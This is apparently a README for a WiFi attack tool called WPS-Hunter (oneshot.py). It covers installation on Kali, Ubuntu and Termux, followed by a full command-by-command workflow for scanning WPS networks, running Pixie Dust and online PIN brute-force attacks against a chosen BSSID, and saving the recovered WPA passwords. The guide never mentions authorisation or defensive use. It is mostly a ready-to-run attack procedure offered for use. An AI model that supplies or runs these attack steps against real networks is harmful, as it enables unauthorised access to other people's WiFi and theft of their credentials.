1. Prerequisites
Hardware
A compatible WiFi adapter that supports monitor mode and packet injection.

General Requirements
Python 3.6 or higher

Root privileges (especially for WiFi operations)

Required system tools: iw, wpa_supplicant, pixiewps

Optional but recommended: aircrack-ng suite

2. Installation Steps
A. On Kali Linux / Ubuntu
Update System and Install Dependencies

bash
sudo apt update
sudo apt install git python3 python3-pip iw wpa_supplicant pixiewps
Clone the Repository

bash
git clone https://github.com/PeterPan9696/WPS-Hunter.git
cd WPS-Hunter
(Optional) Install Additional Python Modules

If the script requires extra modules (e.g., requests), install them:

bash
pip3 install requests
B. On Termux (Android)
Update and Install Packages

bash
pkg update
pkg install git python python-pip root-repo
pkg install iw wpa_supplicant
Install Pixiewps

If available in the repo:

bash
pkg install pixiewps
If not, compile from source (advanced users):

bash
git clone https://github.com/wiire/pixiewps.git
cd pixiewps
make
cp pixiewps $PREFIX/bin/
cd ..
Clone WPS-Hunter

bash
git clone https://github.com/PeterPan9696/WPS-Hunter.git
cd WPS-Hunter
Install Python Dependencies

bash
pip install requests
3. Usage Guide for All Attacks
A. Scanning for WPS Networks
bash
sudo python3 oneshot.py -i wlan0
Replace wlan0 with your wireless interface name.

The tool will scan and list available WPS-enabled networks.

B. PixieWPS Attack
Select Target

Use the scan to identify the BSSID of your target.

Run Pixie Dust Attack

bash
sudo python3 oneshot.py -i wlan0 -b <BSSID> -K
The -K or --pixie-dust flag triggers the PixieWPS attack.

You may be prompted to select a PIN or it will attempt likely ones automatically.

If successful, the WPA PSK (WiFi password) will be displayed.

C. Online WPS Bruteforce Attack
bash
sudo python3 oneshot.py -i wlan0 -b <BSSID> -B
The -B or --bruteforce flag starts an online PIN brute-force attack.

You can specify a starting PIN with -p <PIN> or let the tool generate likely ones.

D. Push Button Connect (PBC) Attack
bash
sudo python3 oneshot.py -i wlan0 -b <BSSID> --pbc
Attempts to connect using the WPS Push Button method.

E. Smart/Resume Bruteforce (Session Recovery)
bash
sudo python3 oneshot.py -i wlan0 -b <BSSID> -B -p <START_PIN>
If a previous session was interrupted, the tool can resume from the last attempted PIN.

F. Additional Options
Save Credentials to File:
Add -w to store found credentials.

Verbose Output:
Add -v for more detailed logs.

Interface Down After Attack:
Add --iface-down to bring the interface down after finishing.

4. Example Attack Workflow
Scan for Targets

bash
sudo python3 oneshot.py -i wlan0
Choose a Target BSSID from the List

Run PixieWPS Attack

bash
sudo python3 oneshot.py -i wlan0 -b <BSSID> -K
If PixieWPS Fails, Try Bruteforce

bash
sudo python3 oneshot.py -i wlan0 -b <BSSID> -B
Store Results

Use -w to save successful credentials.

5. Notes and Troubleshooting
Root Access:
All attacks require root privileges.

Wireless Interface:
Ensure your adapter supports monitor mode and is compatible with your OS.

Termux Limitations:
Some WiFi drivers and monitor mode features may not work on all Android devices.

Missing Modules:
If you see ModuleNotFoundError, install the missing Python module with pip install <module>.
